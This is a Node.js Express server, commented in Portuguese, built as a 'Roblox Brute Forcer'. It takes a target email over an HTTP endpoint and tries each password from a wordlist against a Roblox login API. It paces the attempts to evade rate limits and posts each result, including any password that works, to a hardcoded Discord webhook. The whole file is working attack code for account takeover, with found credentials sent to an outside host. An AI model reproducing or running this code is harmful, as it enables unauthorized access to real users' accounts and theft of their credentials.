const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// URL DO WEBHOOK DO DISCORD
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

app.use(express.json());
app.use(express.static('.'));

// Função para enviar mensagem no Discord via Webhook
async function sendDiscordMessage(content) {
    try {
        await axios.post(WEBHOOK_URL, {
            content: content,
            username: "Roblox Brute Forcer",
            avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg'
        });
        console.log("✅ Mensagem enviada ao Discord!");
    } catch (e) {
        console.error("❌ Erro ao enviar msg no Discord:", e.message);
    }
}

// Função para tentar Login no Roblox (USANDO MOBILE API)
async function tryRobloxLogin(email, password) {
    // Usar a API Mobile que é mais estável para bots
    const loginUrl = "https://www.roblox.com/mobileapi/userinfo";

    try {
        // Fazer o POST direto para a Mobile API
        const response = await axios.post(loginUrl, {
            username: email,
            password: password
        }, {
            headers: {
                'User-Agent': 'RobloxApp/1 (iOS; 12.0)',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            timeout: 8000
        });

        // Se a resposta tiver 'userId' e 'username', foi sucesso
        if (response.data.userId && response.data.username) {
            return {
                success: true,
                username: response.data.username,
                userId: response.data.userId
            };
        } else {
            // Erro comum na Mobile API
            return {
                success: false,
                error: response.data.message || "Erro Desconhecido"
            };
        }

    } catch (error) {
        // Se der erro de rede ou status
        const status = error.response ? error.response.status : 'Sem Status';
        const data = error.response ? error.response.data : error.message;
        
        return {
            success: false,
            error: `Erro HTTP ${status}: ${JSON.stringify(data)}`
        };
    }
}

// FUNÇÃO PRINCIPAL: Ataque de Força Bruta
async function startBruteForce(email) {
    // 1. Ler o ficheiro de senhas
    let passwords = [];
    try {
        const rawData = fs.readFileSync(path.join(__dirname, 'senhas.txt'), 'utf-8');
        passwords = rawData.split('\n').map(p => p.trim()).filter(p => p.length > 0);
    } catch (e) {
        console.error("Erro ao ler senhas.txt:", e.message);
        await sendDiscordMessage(`**❌ ERRO NO ARQUIVO:** senhas.txt não encontrado ou vazio!`);
        return;
    }

    if (passwords.length === 0) {
        await sendDiscordMessage(`**❌ ERRO:** A lista de senhas está vazia!`);
        return;
    }

    console.log(`Iniciando ataque em: ${email} com ${passwords.length} senhas...`);
    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}\n*Usando API Mobile...*`);

    let found = false;

    // 2. Testar cada senha
    for (const password of passwords) {
        if (found) break;

        const result = await tryRobloxLogin(email, password);

        if (result.success) {
            found = true;
            const msg = `**✅ CONTA ENCONTRADA!**\n**Email:** ${email}\n**Senha Correta:** ${password}\n**Username:** ${result.username}\n**ID:** ${result.userId}`;
            await sendDiscordMessage(msg);
            console.log("ENCONTRADA:", password);
        } else {
            // Enviar erro resumido
            const errorMsg = `❌ **Tentativa Falhada**\n**Senha:** ${password}\n**Erro:** ${result.error}`;
            await sendDiscordMessage(errorMsg);
        }

        // Pausa para não bloquear o Email no Roblox (Rate Limit)
        await new Promise(r => setTimeout(r, 2000)); 
    }

    if (!found) {
        await sendDiscordMessage(`**❌ ATAQUE FINALIZADO (Sem Sucesso)**\n**Alvo:** ${email}\n**Senhas Testadas:** ${passwords.length}`);
    }
}

// ENDPOINT: Receber o Email do Site e Iniciar o Ataque
app.post('/start-brute-force', async (req, res) => {
    const { email } = req.body;

    if (!email || !email.includes('@')) {
        return res.json({ success: false, error: "Email inválido" });
    }

    // Iniciar o ataque em "background"
    startBruteForce(email);

    // Retornar resposta imediata ao site
    return res.json({ success: true, message: "Ataque iniciado! Aguarde as notificações no Discord." });
});

// INICIAR SERVIDOR
app.listen(port, () => {
    console.log(`✅ Servidor rodando na porta ${port}`);
});
